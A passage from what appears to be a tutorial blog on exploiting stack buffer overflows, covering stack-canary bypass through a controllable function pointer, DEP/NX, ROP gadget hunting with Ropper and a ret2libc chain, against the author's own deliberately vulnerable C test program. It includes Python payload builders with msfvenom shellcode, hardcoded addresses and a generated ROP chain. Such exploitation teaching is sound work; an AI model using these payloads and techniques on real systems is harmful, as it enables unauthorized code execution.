</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58</span><span style="color:#e6db74">&#34;</span> )                            <span style="color:#75715e"># ( (unsigned char *) &amp;Buffer-&gt;nSize )[0] ( LSB )</span>
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write( struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7fffffffdd70</span>) )  <span style="color:#75715e"># Instruction Pointer</span>
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span> )                     <span style="color:#75715e"># Own Code ( NOPs )</span>
</span></span></code></pre></div><p>Let&rsquo;s try this exploit and see if it will succeed in jumping over the canary or not.</p>
<center><img src="/imgs/mitigations_gdb_canary_jump.png"/></center>
<p>As you can see, We&rsquo;ve successfully defeated the canary and overwritten the instruction pointer, allowing us to hijack the program&rsquo;s execution flow.</p>
<h3 id="preempting-the-canarycookie-protection">PreEmpting The Canary/Cookie Protection</h3>
<p>One way to bypass this type of protection is if we have the ability to hijack the flow of program execution in ways other than modifying the instruction pointer before the validation of the canary value occurs, we can bypass it even if the canary value is destroyed. There are many scenarios that allow us to hijack the execution flow:</p>
<ol>
<li>
<p><strong>Functions Pointers</strong>: If we can control one of the function pointers and it gets called before the canary check occurs, we can bypass that protection.</p>
</li>
<li>
<p><strong>V-Table</strong>: It&rsquo;s really a magic. It&rsquo;s a table that holds the methods pointer of a specific object for supporting polymorphism in the C++ language so each object can know exactly its corresponding methods without any conflict with its parent&rsquo;s methods. If we could control that table, we could leverage any of its methods to execute our own code without being detected by the canary protection.</p>
</li>
<li>
<p><strong>Windows SEH</strong>: SEH stands for Structured Exception Handling, a feature developed by Microsoft for the C/C++ languages used to handle specific exception code cases (such as hardware failures for example). These handlers are located primarily in the stack. If we can trigger an exception from them, we can leverage them to get code execution (before the canary validation).</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdbool.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _Buffer {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">64</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> nSize;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>write)(<span style="color:#66d9ef">struct</span> _Buffer <span style="color:#f92672">*</span>, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">size_t</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>read)(<span style="color:#66d9ef">struct</span> _Buffer <span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>} Buffer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_write</span>(Buffer <span style="color:#f92672">*</span>pBuf, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpData, <span style="color:#66d9ef">size_t</span> n) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>( pBuf<span style="color:#f92672">-&gt;</span>data, cpData, n );
</span></span><span style="display:flex;"><span>    pBuf<span style="color:#f92672">-&gt;</span>nSize <span style="color:#f92672">+=</span> (<span style="color:#66d9ef">int</span>) n;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_read</span>(Buffer <span style="color:#f92672">*</span>pBuf) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>( <span style="color:#e6db74">&#34;Your Data :&#34;</span> );
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;%s&#34;</span>, pBuf<span style="color:#f92672">-&gt;</span>data );
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Buffer <span style="color:#a6e22e">buf_new</span>(<span style="color:#66d9ef">bool</span> bShouldRead) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (Buffer) {
</span></span><span style="display:flex;"><span>        .data <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> },
</span></span><span style="display:flex;"><span>        .nSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>        .write <span style="color:#f92672">=</span> buf_write,
</span></span><span style="display:flex;"><span>        .read <span style="color:#f92672">=</span> ( bShouldRead ) <span style="color:#f92672">?</span> buf_read : NULL
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
</span></span><span style="display:flex;"><span>    Buffer buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">buf_new</span>( (<span style="color:#66d9ef">bool</span>)(argc <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strcmp</span>(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;-r&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) );
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpLine <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;Data: &#34;</span> );
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#a6e22e">getdelim</span>( (<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>cpLine, <span style="color:#f92672">&amp;</span>n, <span style="color:#ae81ff">0x0a</span>, stdin );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">~</span>n ) <span style="color:#75715e">// Sanity check to avoid calling `buf_write` if `getdelim` failed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        buf.<span style="color:#a6e22e">write</span>( <span style="color:#f92672">&amp;</span>buf, cpLine, n );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( buf.read )
</span></span><span style="display:flex;"><span>        buf.<span style="color:#a6e22e">read</span>( <span style="color:#f92672">&amp;</span>buf );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This example is very similar to the previous one, except that in this the Buffer structure has additional members that hold pointers to its associated functions, and during initialization in the buf_new function, the addresses of those functions are assigned to the structure instance.</p>
<pre tabindex="0"><code>┌──(user㉿host)-[~]
└─$ gcc -fstack-protector -zexecstack test.c -o test
                                                                                                                                                         
┌──(user㉿host)-[~]
└─$ ./test -r
Data: Hello World!
Your Data :
Hello World!
</code></pre><p>Notice that the read function pointer is under our control, which we can trigger using the -r option. This function will be called before the canary check, allowing us to preempt the protection, hijack the program execution flow, and execute our own code.</p>
<center><img src="/imgs/mitigations_canary_fp_1.png"/></center>
<p>As we said before, The function pointer we control gets called before the canary. We can abuse it by making it call our shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># msfvenom -a x64 --platform linux -p linux/x64/exec -b &#34;\x0a&#34; -f py AppendExit=true PrependSetuid=true PrependSetgid=true CMD=id</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xff\x6a\x69\x58\x0f\x05\x48\x31\xff\x6a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6a\x58\x0f\x05\x48\xb8\x2f\x62\x69\x6e\x2f\x73</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5e\x52\xe8\x03\x00\x00\x00\x69\x64\x00\x56\x57</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x54\x5e\x6a\x3b\x58\x0f\x05\x48\x31\xff\x6a\x3c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x0f\x05</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">80</span> )                                 <span style="color:#75715e"># Fills the Buffer </span>
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write( struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7fffffffdd70</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>) )  <span style="color:#75715e"># Function Pointer</span>
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x80</span> )                            <span style="color:#75715e"># NOPs for padding</span>
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write( buf )                                       <span style="color:#75715e"># Shellcode</span>
</span></span></code></pre></div><p>Okay, everything is in order, let&rsquo;s shoot.</p>
<center><img src="/imgs/mitigations_canary_fp_2.png"/></center>
<h3 id="other-strategies">Other Strategies</h3>
<p>Not all operating systems and compilers are created equal, and not all canary protection implementations are the same. Sometimes, they may be weak and improperly implemented, allowing them to be bypassed. Here are some of the shortcomings and how they can be exploited to bypass them:</p>
<ol>
<li>
<p><strong>Static Canary/Cookie</strong>: Sometimes, the value of the secret canary is fixed and does not change with each run of the program. In this case, this value can be placed in its place. When it is verified at the end of the function, the condition will be met, and the protection will be broken.</p>
</li>
<li>
<p><strong>Weak Canary/Cookie</strong>: Sometimes, the value of the secret canary changes, but not completely. Only a small fraction of it changes each time the program runs. In this case, we can guess the canary value and then force the program to run several times until we encounter the correct value.</p>
</li>
<li>
<p><strong>Not All Buffers Are Protected</strong>: Compilers usually put this protection on functions that have Bytes/String Buffer. Here, another exploit opportunity arises when the vulnerable code does not contain any of those buffer types.</p>
</li>
<li>
<p><strong>Overwritable Canary/Cookie</strong>: In Windows, for example, this value lives somewhere in the PE image&rsquo;s memory. If we have the ability to write to anything in memory, we can change it to a value we know. For example, this <code>mov qword ptr[RegisterA], RegisterB</code> instruction copies data from register B to the memory that is referenced by register A. If we can control these registers, we can replace the original canary.</p>
</li>
</ol>
<h2 id="dep--nx--no-more-direct-code-execution">DEP / NX == No More Direct Code Execution</h2>
<p>In this and previous articles, we&rsquo;ve always relied on hijacking the flow of program execution by injecting malicious code onto the stack and forcing the program to execute. This protection is specifically designed to prevent this. If an exploit bypasses the canary and gains control of the instruction pointer, the injected code will not be executed. Once the processor begins executing these instructions from the stack, it will trigger an interrupt, informing the operating system that something abnormal has occurred. The system will raise an access violation exception and then terminate the process.</p>
<p>DEP is stands for Data Execution Prevention, it&rsquo;s mainly works in two mode:</p>
<ol>
<li>
<p><strong>Hardware Level Support</strong>: hardware-enforced DEP for CPUs that can mark memory pages as Non-eXecutable (NX bit). In this mode, the processor itself can prevent the execution of any code from memory pages that are not supposed to be executed.</p>
</li>
<li>
<p><strong>Software Level Support</strong>: Software-enforced DEP is an alternative for CPUs that do not have hardware support. In this mode, the operating system intervenes itself to implement this layer of protection.</p>
</li>
</ol>
<p>This feature is set through the boot configurations where your DEP application is set to launch at system boot in accordance with the No-eXecute (NX) page protection policy setting within the boot configuration data, and depending on the policy setting, a specific application may change the DEP setting for this process. There is also more than one mode:</p>
<ol>
<li>
<p><strong>Opt-In</strong>: DEP is only enabled for core system images and those specified in the DEP configuration. enables DEP only for operating system components, including the Windows kernel and drivers. Also, pre-selected programs by administrators.</p>
</li>
<li>
<p><strong>Opt-Out</strong>: DEP is enabled for all programs and services except those in the exception list. If a particular program is not in the exceptions list, then DEP is enabled for that program.</p>
</li>
<li>
<p><strong>AlwaysOn</strong>: In this mode, DEP is enabled for all processes without any exceptions and cannot be turned off at runtime.</p>
</li>
<li>
<p><strong>AlwaysOff</strong>: This mode is the opposite of <strong>AlwaysOn</strong>, as DEP is disabled for all processes and cannot be turned on at runtime.</p>
</li>
</ol>
<p>Each executable binary file contains information about each section and the permissions it requires, such as read, write, and execute permissions. In Windows PE files, for example, <code>_IMAGE_SECTION_HEADER.Characteristics</code> represents the permissions a section requires in memory. If the <code>IMAGE_SCN_MEM_EXECUTE</code> flag has been set, the operating system is forced to disable the &ldquo;Non-eXecute&rdquo; bit for those memory pages. The same is true for ELF files, where <code>ElfN_Shdr.sh_flags</code> represents the permissions for each section. If the <code>SHF_EXECINSTR</code> flag has been set, the data in that section is executable.</p>
<p>When we build code, the compiler and linker assign each section the permissions it needs when loaded into memory. Therefore, we use the <code>-zexecstack</code> option to force the compiler to mark the stack and the data it contains as executable. When the operating system loads a binary file into memory, it marks stack memory pages as executable space. But, by default, the stack&rsquo;s permissions are read and write, not execution.</p>
<h3 id="return-oriented-programming--rop-">Return Oriented Programming ( ROP )</h3>
<p>Yes, we cannot redirect execution to the stack because this protection will prevent us, but we can still redirect execution to executable memory, for example, the executable section of the program itself and the libraries and modules loaded in the process address space. Let me explain more to you.</p>
<p>Any computer program works as follows: It executes a set of instructions sequentially, and when it encounters a return instruction, it extracts the instruction pointer previously stored in the stack and moves to execute the instructions in the memory that that pointer is referred to, and when it encounters a return instruction, it does so again until finish.</p>
<p>We can exploit this by controlling the instruction pointer and its location, making the program jump to execute one or more instructions followed by a return instruction (ROP Gadget). When the return instruction is executed and the instruction pointer is retrieved again, it finds a fake address pointing to another instruction or instructions followed by a return instruction. We continue doing this as a chain until we achieve a satisfactory result.</p>
<p>A ROP gadget can be defined as one or more instructions followed by a return instruction located somewhere in a library, module, or executable section of the program itself. It can be used in sequence with other ROP gadgets to achieve a specific goal; this is called a ROP chain.</p>
<p>We can hunt for needed ROP gadgets using many tools, one of them is an amazing tool called <a href="https://github.com/sashs/Ropper">Ropper</a>, which provides us with many features that we need in return-oriented programming. For example, if we want to hunt for ROP gadgets in libc:</p>
<pre tabindex="0"><code>┌──(user㉿host)-[~]
└─$ ropper
(ropper)&gt; file /usr/lib/x86_64-linux-gnu/libc.so.6
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(libc.so.6/ELF/x86_64)&gt; 
</code></pre><p>We will run the tool and load the executable file using the <code>file</code> command as shown.</p>
<center><img src="/imgs/ropper_gadgets.png"/></center>
<p>We can extract all ROP gadgets in that file using the <code>gadget</code> command, as shown in the picture above. We can also easily hunt for specific gadgets using the &ldquo;search&rdquo; command:</p>
<pre tabindex="0"><code>(libc.so.6/ELF/x86_64)&gt; search pop rdi
[INFO] Searching for gadgets: pop rdi

[INFO] File: /usr/lib/x86_64-linux-gnu/libc.so.6
0x0000000000059c05: pop rdi; adc eax, 0xe762e800; std; jmp qword ptr [rsi - 0x70]; 
0x000000000017cd88: pop rdi; add ah, byte ptr [rdx - 0x4e]; and byte ptr [rdi], ah; ret; 
0x0000000000179ec8: pop rdi; add ah, byte ptr [rdx - 0x4e]; and byte ptr [rsi], ah; ret; 
0x00000000000d7a01: pop rdi; add byte ptr [rax], al; add byte ptr [rdi + rcx + 0x45], al; fsubr st(1); ret 0xfff0; 
0x000000000011e7a2: pop rdi; add ebx, ebp; lahf; xor eax, eax; ret; 
0x000000000016b267: pop rdi; add rax, rdi; shr rax, 2; vzeroupper; ret; 
0x0000000000165b47: pop rdi; add rax, rdi; vzeroupper; ret; 
0x000000000016c935: pop rdi; add rdi, 0x21; add rax, rdi; vzeroupper; ret; 
0x000000000011072d: pop rdi; call rax; 
0x000000000011072d: pop rdi; call rax; mov rdi, rax; mov eax, 0x3c; syscall; 
0x00000000000f43ad: pop rdi; cmp eax, 0x8948fff3; ret 0x448b; 
0x000000000016a927: pop rdi; cmp esi, dword ptr [rdi + rax]; jne 0x16a934; add rax, rdi; vzeroupper; ret; 
0x00000000001671db: pop rdi; cmp sil, byte ptr [rdi + rax]; jne 0x1671e9; add rax, rdi; vzeroupper; ret; 
0x000000000002d13c: pop rdi; jmp rax; 
0x0000000000054968: pop rdi; mov dword ptr [rdi], 0; mov eax, 2; ret; 
0x00000000000f9a10: pop rdi; mov eax, 0x3a; syscall; 
0x0000000000100a1a: pop rdi; or al, ch; iretd; jns 0x100a12; jmp qword ptr [rsi - 0x7d]; 
0x0000000000100b60: pop rdi; or byte ptr [rax - 0x77], cl; pop rbp; add al, ch; test dword ptr [rax - 0xe], edi; jmp qword ptr [rsi - 0x7d]; 
0x0000000000110e0c: pop rdi; or eax, 0x64d8f700; mov dword ptr [rdx], eax; mov eax, 0xffffffff; ret; 
0x00000000001420d2: pop rdi; out dx, al; dec dword ptr [rax - 0x77]; ret 0x8548; 
0x000000000002a3fc: pop rdi; pop rbp; ret; 
0x000000000015e700: pop rdi; cli; dec dword ptr [rax - 0x39]; ret 0xffff; 
0x000000000002a205: pop rdi; ret;
</code></pre><p>The tool has collected all the gadgets related to the instruction we are looking for (<code>pop rdi</code>). We can also make the search more general.</p>
<pre tabindex="0"><code>(libc.so.6/ELF/x86_64)&gt; search mov [rbx + 0x40],%
[INFO] Searching for gadgets: mov [rbx + 0x40],%

[INFO] File: /usr/lib/x86_64-linux-gnu/libc.so.6
0x00000000000a3bcf: mov dword ptr [rbx + 0x40], eax; and byte ptr [rbx + 0x50], 0xfe; mov qword ptr [rbx], rdi; mov dword ptr [rbx + 0x30], eax; call rcx;                                                                                                                                    
0x00000000001161f5: mov dword ptr [rbx + 0x40], eax; mov eax, 1; add rsp, 8; pop rbx; pop rbp; ret; 
0x000000000003fa47: mov dword ptr [rbx + 0x40], esi; pop rbx; ret; 
0x000000000003fa28: mov dword ptr [rbx + 0x40], esi; xor eax, eax; pop rbx; ret; 
0x000000000008ba03: mov dword ptr [rbx + 0x40], esp; mov dword ptr [rbx], eax; pop rbx; pop rbp; pop r12; ret; 
0x000000000008be8e: mov dword ptr [rbx + 0x40], esp; pop rbx; pop rbp; pop r12; ret; 
0x000000000008ba02: mov qword ptr [rbx + 0x40], r12; mov dword ptr [rbx], eax; pop rbx; pop rbp; pop r12; ret; 
0x000000000008be8d: mov qword ptr [rbx + 0x40], r12; pop rbx; pop rbp; pop r12; ret; 
0x00000000000a3bce: mov qword ptr [rbx + 0x40], r8; and byte ptr [rbx + 0x50], 0xfe; mov qword ptr [rbx], rdi; mov dword ptr [rbx + 0x30], eax; call rcx;                                                                                                                                     
0x00000000001161f4: mov qword ptr [rbx + 0x40], rax; mov eax, 1; add rsp, 8; pop rbx; pop rbp; ret; 
</code></pre><p>As you can see, we&rsquo;ve made the tool search for any memory move instruction pointed to by register <code>rbx+40</code>, regardless of the operand. This is very useful because, not in all cases, we&rsquo;ll have gadgets that do exactly what we want. The alternative is to use different instructions indirectly to achieve the same result. The tool also provides an amazing feature to build fully ready-to-use ROP chains for us.</p>
<pre tabindex="0"><code>(libc.so.6/ELF/x86_64)&gt; ropchain execve cmd=id

[INFO] ROPchain Generator for syscall execve:


[INFO] 
write command into data section
rax 0xb
rdi address to cmd
rsi address to null
rdx address to null


[INFO] Try to create chain which fills registers without delete content of previous filled registers
[*] Try permuation 1 / 24
[INFO] 

[INFO] Look for syscall gadget

[INFO] syscall gadget found
[INFO] generating rop chain
#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack(&#39;Q&#39;, x)

IMAGE_BASE_0 = 0x0000000000000000 # 2f1f84e0f4df64e0eb1829fabd8720136456dc4efce9962cb1188f8d436e30b0
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = &#39;&#39;

rop += rebase_0(0x000000000003c714) # 0x000000000003c714: pop r13; ret; 
rop += &#39;//////id&#39;
rop += rebase_0(0x000000000002aa5f) # 0x000000000002aa5f: pop rbx; ret; 
rop += rebase_0(0x00000000001e7000)
rop += rebase_0(0x000000000005e961) # 0x000000000005e961: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000003c714) # 0x000000000003c714: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000002aa5f) # 0x000000000002aa5f: pop rbx; ret; 
rop += rebase_0(0x00000000001e7008)
rop += rebase_0(0x000000000005e961) # 0x000000000005e961: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000002a205) # 0x000000000002a205: pop rdi; ret; 
rop += rebase_0(0x00000000001e7000)
rop += rebase_0(0x000000000002bb39) # 0x000000000002bb39: pop rsi; ret; 
rop += rebase_0(0x00000000001e7008)
rop += rebase_0(0x000000000010d37d) # 0x000000000010d37d: pop rdx; ret; 
rop += rebase_0(0x00000000001e7008)
rop += rebase_0(0x0000000000043067) # 0x0000000000043067: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x000000000008ed72) # 0x000000000008ed72: syscall; ret; 
print(rop)
[INFO] rop chain generated!
</code></pre><p>As you can see, the tool has created a full ROP chain for us to execute System Call (<code>execve(&quot;id&quot;)</code>). All we need to do is set the variable <code>IMAGE_BASE_0</code> to the libc base address at runtime. Unfortunately, this is very limited, and the tool cannot create chains for everything we need, nor can it be completely reliable, as the cases vary from program to program and from one bug to another.</p>
<h4 id="return-to-libc--ret2libc-">Return To Libc ( ret2libc )</h4>
<p>Let&rsquo;s practice on <a href="/labs/bof_1.c">the first example</a> presented in this blog and this time we will not compile it using the <code>-zexecstack</code> option.</p>
<center><img src="/imgs/mitigations_dep_1.png"/></center>
<p>Notice that the first time we compiled with the <code>-zexecstack</code> option, the exploitation succeeded, and the shellcode executed successfully, but the second time, when we did not use that option, the exploitation failed, and the shellcode did not execute.</p>
<p>We need to change our code execution strategy so that instead of making the program jump to execute the code injected into the stack, we make it return to libc and run the system function, which allows us to run commands on the system. The system function takes exactly one argument, the command in a null-terminated string. According to the Linux calling convention, the first parameter for any function call should passed over the rdi register, so we need a ROP gadget that sets our command address to rdi, and once this gadget returns, the saved instruction pointer should be another gadget that call the system function.</p>
<center><img src="/imgs/mitigations_dep_3.png"/></center>
<p>Great. Using the <a href="https://github.com/longld/peda">Peda</a> <code>searchmem</code> command, we found the string &ldquo;id&rdquo; in the C library that we will use as a parameter to the system function.</p>
<pre tabindex="0"><code>gdb-peda$ x/s 0x7ffff7f5a078
0x7ffff7f5a078: &#34;id&#34;
</code></pre><p>Okay, now we need a ROP gadget that sets this pointer to the RDI register. A typical ROP gadget is <code>pop rdi; ret</code>, so we&rsquo;ll replace the instruction pointer with the address of that gadget and put the command address next to it. Now, we&rsquo;re ready to call the system function. We&rsquo;ll follow the same approach: we&rsquo;ll put the system function on the stack and use the <code>pop rax; ret</code> gadget to retrieve it, and then we&rsquo;ll use the <code>call rax</code> gadget. But then the process will crash because once the system function finishes and returns, the next instruction pointer will be an address for something not under our control. So, we must call the exit function afterward to close the program properly. Fortunately, I found a gadget that calls a register (<code>call rax</code>) and then calls the exit function without us having to do it ourselves.</p>
<pre tabindex="0"><code>(gdb) x/3i 0x7ffff7dd7d66 
   0x7ffff7dd7d66 &lt;__libc_start_call_main+118&gt;: call   *%rax
   0x7ffff7dd7d68 &lt;__libc_start_call_main+120&gt;: mov    %eax,%edi
   0x7ffff7dd7d6a &lt;__libc_start_call_main+122&gt;: call   0x7ffff7df0280 &lt;__GI_exit&gt;
(gdb) 
</code></pre><p>We build our ROP chain as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hijack_exec</span>(p: Popen, canary):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x112</span>                               <span style="color:#75715e"># Fills the stack frame</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, canary )                <span style="color:#75715e"># Places the correct canary value </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>                                 <span style="color:#75715e"># Base pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7dd8205</span> )        <span style="color:#75715e"># pop rdi; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7f5a078</span> )        <span style="color:#75715e"># The command address ( id )</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7df1067</span> )        <span style="color:#75715e"># pop rax; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7e008f0</span> )        <span style="color:#75715e"># system function address</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7dd7d66</span> )        <span style="color:#75715e"># call rax ; system( &#34;id&#34; ); exit( 0 )</span>
</span></span><span style="display:flex;"><span>
